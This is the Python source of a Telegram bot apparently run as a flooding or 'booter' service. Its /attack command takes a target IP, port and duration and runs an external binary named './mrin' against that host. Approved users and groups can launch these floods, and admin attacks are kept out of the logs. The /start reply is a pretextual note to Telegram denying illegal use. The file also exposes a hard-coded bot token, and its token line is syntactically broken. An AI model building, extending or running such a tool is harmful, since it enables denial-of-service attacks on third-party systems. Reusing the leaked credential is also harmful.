import telebot
import subprocess
import datetime
import os
import time
import requests
import platform
import socket
import logging
import json
from dotenv import load_dotenv
from ratelimit import limits, sleep_and_retry
import threading

# Load environment variables
load_dotenv()

# Configuration
BOT_TOKENS = [os.getenv('BOT_TOKEN_1'='7275048595:AAEUmiY1AYw7bWyy2EvaETdpfTMdinhhpNg')]
ADMIN_IDS = ["6240348610", "6188354219", "1066744659", "8159441634", "1202212810",]
WHITELISTED_IPS = ["127.0.0.1", "192.168.1.1"]
UNAUTHORIZED_MESSAGE = "TUM ABHI APPROVED NAHI HO BRO"
LOG_FILE = "bot.log"
USERS_FILE = "users.txt"
GROUPS_FILE = "groups.json"
CALLS = 5
PERIOD = 60

# Global variables
allowed_user_ids = []
group_approvals = {}  # {group_id: [user_id, ...]}
bots = [telebot.TeleBot(token) for token in BOT_TOKENS]
start_time = datetime.datetime.now()

# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

# Load authorized users and group approvals
def load_users():
    global allowed_user_ids
    try:
        with open(USERS_FILE, "r") as file:
            allowed_user_ids = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        allowed_user_ids = []

def load_group_approvals():
    global group_approvals
    try:
        with open(GROUPS_FILE, "r") as file:
            group_approvals = {str(k): v for k, v in json.load(file).items()}
    except FileNotFoundError:
        group_approvals = {}

def save_group_approvals():
    with open(GROUPS_FILE, "w") as file:
        json.dump(group_approvals, file)

# Utility functions
def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
        return response.get("city", "Unknown") + ", " + response.get("country_name", "Unknown")
    except requests.RequestException:
        return "Unknown"

def get_device_info():
    return platform.system()

def is_host_alive(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=2):
            return "Alive"
    except:
        return "Offline"

def log_user_activity(log_data, user_id=None):
    if user_id not in ADMIN_IDS:
        logging.info(log_data)

def is_user_authorized(user_id, chat_id):
    user_id = str(user_id)
    # Private chat: Check global allowed_user_ids or ADMIN_IDS
    if chat_id > 0:  # Positive chat_id indicates private chat
        return user_id in ADMIN_IDS or user_id in allowed_user_ids
    # Group chat: Check group_approvals or ADMIN_IDS
    else:
        group_id = str(chat_id)
        return user_id in ADMIN_IDS or (group_id in group_approvals and user_id in group_approvals[group_id])

# Attack completion notification
def monitor_attack(process, bot, chat_id, target, port, duration):
    process.wait()
    try:
        bot.send_message(chat_id, f"Attack on {target}:{port} for {duration}s has completed.")
    except Exception as e:
        logging.error(f"Failed to send attack completion notification: {e}")

# Handlers
def create_handlers(bot):
    @bot.message_handler(commands=['start'])
    def start_command(message):
        user_id = str(message.chat.id)
        if user_id in ADMIN_IDS:
            bot.reply_to(message, (
                f"Dear {user_id},\n\n"
                "Subject: Clarification Regarding Channel Content and Bot Use\n\n"
                "Dear Telegram Team,\n\n"
                "I would like to clarify that my channel and bot do not support, promote, or engage in any illegal activities, including the sale of real-world firearms or prohibited goods. "
                "Any mention of terms such as 'guns', 'gunlabs', or similar references pertains exclusively to in-game items from PlayerUnknown's Battlegrounds (PUBG) and Battlegrounds Mobile India, "
                "and has no connection to real-life weapons or illegal transactions.\n\n"
                "I fully respect Telegram’s policies and am committed to ensuring that my bot and channel remain focused on gaming-related discussions and virtual in-game transactions.\n\n"
                "Thank you for your attention and support."
            ))
        else:
            bot.reply_to(message, UNAUTHORIZED_MESSAGE)

    @bot.message_handler(commands=['add'])
    def add_user(message):
        user_id = str(message.chat.id)
        if user_id in ADMIN_IDS:
            command = message.text.split()
            if len(command) > 1:
                user_to_add = command[1]
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USERS_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")
                    response = f"User {user_to_add} added successfully to global allowed users."
                else:
                    response = "User already exists in global allowed users."
            else:
                response = "Usage: /add <userid>"
        else:
            response = "BRO TUM ADMINS ME NAHI HO ."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['remove'])
    def remove_user(message):
        user_id = str(message.chat.id)
        if user_id in ADMIN_IDS:
            command = message.text.split()
            if len(command) > 1:
                user_to_remove = command[1]
                if user_to_remove in allowed_user_ids:
                    allowed_user_ids.remove(user_to_remove)
                    with open(USERS_FILE, "w") as file:
                        for uid in allowed_user_ids:
                            file.write(f"{uid}\n")
                    response = f"User {user_to_remove} removed from global allowed users."
                else:
                    response = f"User {user_to_remove} not found in global allowed users."
            else:
                response = "Usage: /remove <userid>"
        else:
            response = "BRO TUM ADMINS ME NAHI HO ."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['approve'])
    def approve_user(message):
        user_id = str(message.chat.id)
        chat_id = message.chat.id
        if user_id in ADMIN_IDS:
            if chat_id > 0:
                response = "This command can only be used in a group."
            else:
                command = message.text.split()
                if len(command) > 1:
                    user_to_approve = command[1]
                    group_id = str(chat_id)
                    if group_id not in group_approvals:
                        group_approvals[group_id] = []
                    if user_to_approve not in group_approvals[group_id]:
                        group_approvals[group_id].append(user_to_approve)
                        save_group_approvals()
                        response = f"User {user_to_approve} approved in this group."
                    else:
                        response = "User already approved in this group."
                else:
                    response = "Usage: /approve <userid>"
        else:
            response = "BRO TUM ADMINS ME NAHI HO ."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['unapprove'])
    def unapprove_user(message):
        user_id = str(message.chat.id)
        chat_id = message.chat.id
        if user_id in ADMIN_IDS:
            if chat_id > 0:
                response = "This command can only be used in a group."
            else:
                command = message.text.split()
                if len(command) > 1:
                    user_to_unapprove = command[1]
                    group_id = str(chat_id)
                    if group_id in group_approvals and user_to_unapprove in group_approvals[group_id]:
                        group_approvals[group_id].remove(user_to_unapprove)
                        if not group_approvals[group_id]:
                            del group_approvals[group_id]
                        save_group_approvals()
                        response = f"User {user_to_unapprove} unapproved in this group."
                    else:
                        response = f"User {user_to_unapprove} not approved in this group."
                else:
                    response = "Usage: /unapprove <userid>"
        else:
            response = "BRO TUM ADMINS ME NAHI HO ."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['groupusers'])
    def show_group_users(message):
        user_id = str(message.chat.id)
        chat_id = message.chat.id
        if user_id in ADMIN_IDS:
            if chat_id > 0:
                response = "This command can only be used in a group."
            else:
                group_id = str(chat_id)
                if group_id in group_approvals and group_approvals[group_id]:
                    response = "Approved Users in this group:\n" + "\n".join(f"- {uid}" for uid in group_approvals[group_id])
                else:
                    response = "No approved users in this group."
        else:
            response = "BRO TUM ADMINS ME NAHI HO ."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['clearlogs'])
    def clear_logs_command(message):
        user_id = str(message.chat.id)
        if user_id in ADMIN_IDS:
            try:
                with open(LOG_FILE, "r+") as file:
                    log_content = file.read()
                    if log_content.strip() == "":
                        response = "Logs are already cleared. No data found."
                    else:
                        with open(f"backup_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", "w") as backup:
                            backup.write(log_content)
                        file.seek(0)
                        file.truncate()
                        response = "Logs cleared successfully. Backup created."
            except FileNotFoundError:
                response = "Logs are already cleared."
        else:
            response = "BRO TUM ADMINS ME NAHI HO ."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['allusers'])
    def show_all_users(message):
        user_id = str(message.chat.id)
        if user_id in ADMIN_IDS:
            if allowed_user_ids:
                response = "Global Authorized Users:\n" + "\n".join(f"- {uid}" for uid in allowed_user_ids)
            else:
                response = "No global authorized users."
        else:
            response = "BRO TUM ADMINS ME NAHI HO ."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['logs'])
    def show_recent_logs(message):
        user_id = str(message.chat.id)
        if user_id in ADMIN_IDS:
            if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
                try:
                    with open(LOG_FILE, "rb") as file:
                        bot.send_document(message.chat.id, file)
                    return
                except Exception:
                    response = "Could not send logs."
            else:
                response = "No data found."
        else:
            response = "BRO TUM ADMINS ME NAHI HO ."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['id'])
    def show_user_id(message):
        user_id = str(message.chat.id)
        bot.reply_to(message, f"Your ID: {user_id}")

    @sleep_and_retry
    @limits(calls=CALLS, period=PERIOD)
    @bot.message_handler(commands=['attack'])
    def handle_attack(message):
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
        username = message.from_user.username or "NoUsername"

        if is_user_authorized(user_id, chat_id):
            command = message.text.split()
            if len(command) != 4:
                bot.reply_to(message, "Usage: /attack <target> <port> <time>\nExample: /attack 192.168.1.1 80 60")
                return

            target, port, duration = command[1], command[2], command[3]
            if not validate_ip(target):
                bot.reply_to(message, "Invalid IP address.")
                return
            if target in WHITELISTED_IPS:
                bot.reply_to(message, "Target IP is whitelisted.")
                return
            try:
                port = int(port)
                duration = int(duration)
                if duration > 380:
                    bot.reply_to(message, "Error: Time interval must be less than 380.")
                    return
            except ValueError:
                bot.reply_to(message, "Port and time must be integers.")
                return

            response = f"Flooding parameters set: {target}:{port} for {duration}. Attack Running."
            bot.reply_to(message, response)
            full_command = ["./mrin", target, str(port), str(duration), "1800"]
            process = subprocess.Popen(full_command, shell=False)
            threading.Thread(target=monitor_attack, args=(process, bot, chat_id, target, port, duration), daemon=True).start()

            if user_id not in ADMIN_IDS:
                ip = target
                status = is_host_alive(ip, port)
                location = get_ip_info(ip)
                device = get_device_info()
                timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                log_line = (
                    f"{timestamp} Name: {full_name} | Username: @{username} | "
                    f"UserID: {user_id} | IP: {ip} | Port: {port} | Time: {duration}s | "
                    f"Status: {status} | Bot: {BOT_TOKENS.index(bot.token)+1} | "
                    f"Device: {device} | Location: {location}"
                )
                log_user_activity(log_line, user_id)
        else:
            bot.reply_to(message, UNAUTHORIZED_MESSAGE)

    @bot.message_handler(commands=['mylogs'])
    def show_command_logs(message):
        user_id = str(message.chat.id)
        if user_id in ADMIN_IDS:
            response = "Admin is anonymous. No logs stored."
        else:
            try:
                with open(LOG_FILE, "r") as file:
                    logs = file.readlines()
                    user_logs = [log for log in logs if f"UserID: {user_id}" in log]
                    response = "".join(user_logs) if user_logs else "No Command Logs Found For You."
            except FileNotFoundError:
                response = "No command logs found."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['uptime'])
    def show_status(message):
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        if is_user_authorized(user_id, chat_id):
            uptime = datetime.datetime.now() - start_time
            days, seconds = uptime.days, uptime.seconds
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            response = f"Bot Uptime: {days}d {hours}h {minutes}m\nActive Attacks: {len([p for p in subprocess._active if p.poll() is None])}"
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, UNAUTHORIZED_MESSAGE)

    @bot.message_handler(commands=['help'])
    def show_help(message):
        help_text = '''
Available Commands:
/attack <target> <port> <time> : Launch attack
/add <userId> : Add global authorized user
/remove <userId> : Remove global authorized user
/approve <userId> : Approve user in this group
/unapprove <userId> : Unapprove user in this group
/groupusers : List approved users in this group
/clearlogs : Clear all logs
/allusers : List global authorized users
/logs : Download all logs
/id : Show your user ID
/mylogs : Show your own logs
/uptime : Show bot uptime and active attacks
'''
        bot.reply_to(message, help_text)

# Run bots
def run_bots():
    load_users()
    load_group_approvals()
    for bot in bots:
        create_handlers(bot)
    while True:
        for bot in bots:
            try:
                bot.infinity_polling()
            except Exception as e:
                logging.error(f"Error in Bot: {e}")
                time.sleep(5)

if __name__ == "__main__":
    print("Bot is running...")
    run_bots()